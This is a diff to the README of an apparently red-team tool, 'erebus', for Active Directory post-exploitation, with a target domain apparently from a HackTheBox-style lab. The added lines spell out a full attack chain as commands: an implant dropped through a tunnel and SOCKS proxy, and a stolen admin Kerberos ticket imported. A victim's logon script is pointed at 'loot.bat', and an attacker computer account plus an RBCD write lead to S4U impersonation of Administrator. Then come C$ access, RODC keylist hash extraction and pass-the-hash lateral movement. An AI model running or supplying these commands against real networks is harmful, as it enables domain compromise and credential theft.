@@ -9,10 +9,10 @@ Focused **internal AD post-ex** path. Not an MSF replacement.
 If the box cannot reach your VPN, or you cannot reach the DC from the operator host, **do this before LDAP/SMB/Kerberos**.
 
 ```bash
-erebus inbound status                         # tun0, :8443, ALL_PROXY, firewalld
-erebus inbound tunnel user@TARGET             # box cannot reach tun0 → C2 on 127.0.0.1:8443
-# after C Linux session:
-erebus op socks start --port 1080
+erebus inbound status
+erebus inbound drop user@TARGET               # post-foothold: tunnel + generate (secret in DB)
+# after implant session:
+erebus inbound through --probe DC:389
 eval "$(erebus inbound env --port 1080)"      # ALL_PROXY for host ldap/smb/ad/kerberos
 erebus ldap bind --dc DC --domain DOM --user u --pass-file p
 ```
@@ -37,7 +37,13 @@ Approvals: `ldap_enum`, `kerberoast` (high).
 # Host-side first when WinRM is filtered / no implant yet:
 erebus smb shares --host DC --anon
 erebus ldap enum --dc DC --domain DOM --user u --pass-file p --type interesting
+erebus ldap enum --dc DC --domain DOM --user u --pass-file p --type acl
 erebus ldap dangling --dc DC --domain DOM --user u --pass-file p
+erebus kerberos asktgt --dc DC --domain DOM --user u --pass-file p
+erebus kerberos ticket import ./admin.ccache
+erebus ldap bind --dc DC --domain DOM --ticket <id>
+erebus ldap set --dc DC --domain DOM --user u --pass-file p --target bob scriptPath loot.bat --yes
+erebus ad add-computer --dc DC --domain DOM --user u --pass-file p --name ATTACK --out ./mach.pass --yes
 
 foothold (implant)
   → recon
@@ -56,7 +62,12 @@ kerberos skew --dc <DC>                    # preflight (fail loud if |skew| > 5m
 soft: smb write SYSVOL/NETLOGON + ldap set scriptPath (recipe)
   → interactive logon bot runs script → ForceChangePassword / marker
   → lateral winrm as privileged user
-  → ad add-computer + rbcd write + kerberos s4u (AES)   # B.7–B.8
+  → ad add-computer + erebus rbcd write --to HOST$ --from ATTACK$ --yes
+  → erebus kerberos s4u --user ATTACK$ --pass-file ./mach.pass \
+        --impersonate Administrator --spn cifs/dc.domain.htb \
+        [--altservice CIFS/other]
+  → erebus smb ls --host HOST --share C$ --ticket <id>
+  → erebus ldap bind --dc DC --domain DOM --ticket <id>   # GSSAPI; internal ClockOffset, no faketime
   → kerberos keylist (RODC krbtgt AES) → NT hash         # B.9
   → lateral winrm --hash
 ```
@@ -104,8 +115,8 @@ lateral winrm <target> <cmd> --user u --pass p
 lateral winrm <target> <cmd> --user u --hash <NThash> --domain DOM
 loot
 # Host-side (no session): erebus ad password --dc DC --domain D --user U --pass-file P --target T --new-pass-file N
-# Sprint B+ (landing): ldap set scriptPath | ad add-computer
-#                      rbcd write | kerberos s4u | kerberos keylist | ticket import
+# Host-side writes: ldap set scriptPath | ad add-computer | rbcd write
+#                   kerberos s4u | kerberos keylist (B.9 landing)
 ```
 
 ### Dangling ADCS templates (DanglingTree)
